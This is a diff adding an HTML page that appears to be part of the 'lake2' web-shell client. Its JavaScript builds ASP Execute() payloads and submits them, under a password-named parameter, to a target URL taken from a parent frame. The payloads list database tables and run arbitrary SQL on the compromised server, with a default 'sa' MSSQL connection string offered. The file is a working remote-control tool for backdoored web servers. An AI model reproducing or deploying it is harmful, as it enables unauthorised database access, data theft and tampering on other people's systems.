@@ -1,0 +1,47 @@
+<style>BODY {	FONT-SIZE: 9pt;	COLOR: #000000;	FONT-FAMILY: "Courier New";	scrollbar-face-color:#E4E4F3;	scrollbar-highlight-color:#FFFFFF;	scrollbar-3dlight-color:#E4E4F3;	scrollbar-darkshadow-color:#9C9CD3;	scrollbar-shadow-color:#E4E4F3;	scrollbar-arrow-color:#4444B3;	scrollbar-track-color:#EFEFEF;}TABLE {	FONT-SIZE: 9pt;	FONT-FAMILY: "Courier New";	BORDER-COLLAPSE: collapse;	border-top-width: 1px;	border-right-width: 1px;	border-bottom-width: 1px;	border-left-width: 1px;	border-top-style: solid;	border-right-style: none;	border-bottom-style: none;	border-left-style: solid;	border-top-color: #d8d8f0;	border-right-color: #d8d8f0;	border-bottom-color: #d8d8f0;	border-left-color: #d8d8f0;}.tr {	font-family: "Courier New";	font-size: 9pt;	background-color: #e4e4f3;	text-align: center;}.td {	font-family: "Courier New";	font-size: 9pt;	background-color: #f9f9fd;}.warningColor {	font-family: "Courier New";	font-size: 9pt;	color: #ff0000;}input {	font-family: "Courier New";	BORDER-TOP-WIDTH: 1px;	BORDER-LEFT-WIDTH: 1px;	FONT-SIZE: 12px;	BORDER-BOTTOM-WIDTH: 1px;BORDER-RIGHT-WIDTH: 1px;	color: #000000;}textarea {	font-family: "Courier New";	BORDER-TOP-WIDTH: 1px;	BORDER-LEFT-WIDTH: 1px;	FONT-SIZE: 12px;	BORDER-BOTTOM-WIDTH: 1px;	BORDER-RIGHT-WIDTH: 1px;	color: #000000;}A:link {	FONT-SIZE: 9pt; 	COLOR: #000000;	FONT-FAMILY: "Courier New"; 	TEXT-DECORATION: none;}tr {	font-family: "Courier New";	font-size: 9pt;	line-height: 18px;}td {	font-family: "Courier New";	font-size: 9pt;	border-top-width: 1px;	border-right-width: 1px;	border-bottom-width: 1px;	border-left-width: 1px;	border-top-style: none;	border-right-style: solid;	border-bottom-style: solid;	border-left-style: none;	border-top-color: #d8d8f0;	border-right-color: #d8d8f0;	border-bottom-color: #d8d8f0;	border-left-color: #d8d8f0;}.trHead {	font-family: "Courier New";	font-size: 9pt;	background-color: #e4e4f3;	line-height: 3px;}.inputLogin {	font-family: "Courier New";	font-size: 9pt;	border: 1px solid #d8d8f0;	background-color: #f9f9fd;	vertical-align: bottom;}</style>
+<link rel="stylesheet" type="text/css" href="lake2.css">
+<div align="center">
+
+<div align="center"><font face="Verdana">DataBase</font></div>
+<form name="xform" method="post" target="_blank">
+<table width="100%"  border="0" align="center">
+<tr>
+<td width="15%"><font face="Verdana">Connection Str:</font></td>
+<td width="85%"><font face="Verdana"><input name="conn" type="text" value="Provider=microsoft.jet.oledb.4.0;data source=f:\fuck.mdb" size="60"> 
+</font> </td>
+</tr>
+<tr>
+<td colspan="2"><font face="Verdana">Type:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  <input name="radiobutton" type="radio" onClick="OnAcc();" value="ac" checked>
+  MSAccess
+    <input name="radiobutton" type="radio" value="sq" onClick="OnSQL();">
+  MSSQL</font></td>
+</tr>
+<font face="Verdana">
+<input type="hidden" name="code" value=''>
+</font>
+</table>
+  <font face="Verdana">
+  <input type="hidden" name="x54" value=''> 
+  <input type="hidden" name="org" value=''>
+  <input type="hidden" name="StrScript" value=''>
+</font>
+</form>
+	<font face="Verdana">
+<script>
+function OnSQL(){
+xform.conn.value='Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=;';
+}
+function OnAcc(){
+xform.conn.value='Provider=microsoft.jet.oledb.4.0;data source=f:\\fuck.mdb';
+}
+function RUNonclick(){
+document.xform.code.value = 'Execute("response.clear:temp=request(""StrQuery""):StrScript=Request(""StrScript""):StrResult=""<form name=xform method=post target=_blank action=""&request(""url"")&"">SQL Query:<input name=StrQuery type=text size=60><br>Page: <input name=page type=text value=1 size=2> 20 Records/Page<br><input type=submit value=Submit onClick=""""RUN();""""><input type=hidden name=""&request(""x54"")&""><input type=hidden name=conn value=""""""&request(""conn"")&""""""></form>The Table:<br>"":Set conn=Server.CreateObject(""Adodb.Connection""):conn.Open Request(""conn""):Set rsTable=conn.OpenSchema(20,Array(Empty,Empty,Empty,""table"")):Do Until rsTable.Eof:StrResult=StrResult&""<a href=""""#"""" onClick=""""xTable(\'""&rsTable(""Table_Name"")&""\');"""">""&rsTable(""Table_Name"")&""</a><br>"":rsTable.MoveNext:Loop:rsTable.MoveFirst:Set rsTable=Nothing:If temp<>"""" Then:response.clear:Set rs=Server.CreateObject(""Adodb.RecordSet""):If Left(LCase(temp),7)=""select "" Then:rs.Open temp,conn,1,1:rs.PageSize=20:If rs.Fields.Count>0 Then:SQLResult=""<br><table border=1 cellpadding=0 cellspacing=0 width=98%><tr><td height=22 align=center colspan=""&rs.Fields.Count&""></td></tr><tr>"":For j=0 To rs.Fields.Count-1:SQLResult=SQLResult&""<td height=22 align=center>""&rs.Fields(j).Name&""</td>"":Next:For i = 1 To 20:If rs.Eof Then:Exit For:End If:SQLResult=SQLResult&""</tr><tr valign=top>"":For j=0 To rs.Fields.Count-1:SQLResult=SQLResult&""<td height=22 align=center>""&rs(j)&""</td>"":Next:SQLResult=SQLResult&""</tr>"":rs.MoveNext:Next:End If:SQLResult=SQLResult&""</table>"":rs.Close:Else:conn.Execute(temp):SQLResult=SQLResult&""<center><br><b>Done!</b></center>"":End If:End If:conn.close:Set conn=Nothing:Response.Write(StrResult):response.write(SQLResult):StrScript=Replace(StrScript,""{LAKE2}"",request(""x54"")):StrScript=Replace(StrScript,""{CODE}"",Replace(Replace(request(""org""),""\\"",""\\\\""),""\'"",""\\\'"")):response.write(StrScript):Response.End")';
+document.xform.StrScript.value = '<scr'+'ipt>function RUN(){document.xform.{LAKE2}.value=\'{CODE}\';}function xTable(str){document.xform.StrQuery.value=\'Select * from [\'+str+\']\'}</scr'+'ipt>';
+document.xform.org.value = 'Execute("response.clear:temp=request(""StrQuery""):Set conn=Server.CreateObject(""Adodb.Connection""):conn.Open Request(""conn""):If temp<>"""" Then:Set rs=Server.CreateObject(""Adodb.RecordSet""):If Left(LCase(temp),7)=""select "" Then:If Request(""page"")="""" Then Page=1:Else:Page=Request(""page""):End If:rs.Open temp,conn,1,1:rs.PageSize=20:If Not rs.Eof Then:rs.AbsolutePage=page:End If:If rs.Fields.Count>0 Then:SQLResult=""<br><table border=1 cellpadding=0 cellspacing=0 width=98%><tr><td height=22 align=center colspan=""&rs.Fields.Count&"">Read the Database</td></tr><tr>"":For j=0 To rs.Fields.Count-1:SQLResult=SQLResult&""<td height=22 align=center>""&rs.Fields(j).Name&""</td>"":Next:For i = 1 To 20:If rs.Eof Then:Exit For:End If:SQLResult=SQLResult&""</tr><tr valign=top>"":For j=0 To rs.Fields.Count-1:SQLResult=SQLResult&""<td height=22 align=center>""&server.HTMLEncode(rs(j))&""</td>"":Next:SQLResult=SQLResult&""</tr>"":rs.MoveNext:Next:End If:SQLResult=SQLResult&""</table><div align=center>AbsolutePage/PageCount: ""&Page&""/""&rs.PageCount&""</div>"":rs.Close:Else:conn.Execute(temp):SQLResult=SQLResult&""<center><br><b>Done!</b></center>"":End If:End If:conn.close:Set conn=Nothing:response.write(SQLResult):Response.End")';
+document.xform.x54.value = parent.pwd.value;
+document.xform.code.name = parent.pwd.value;
+document.xform.action = parent.url.value;
+document.xform.submit();
+}
+</script></font></div>
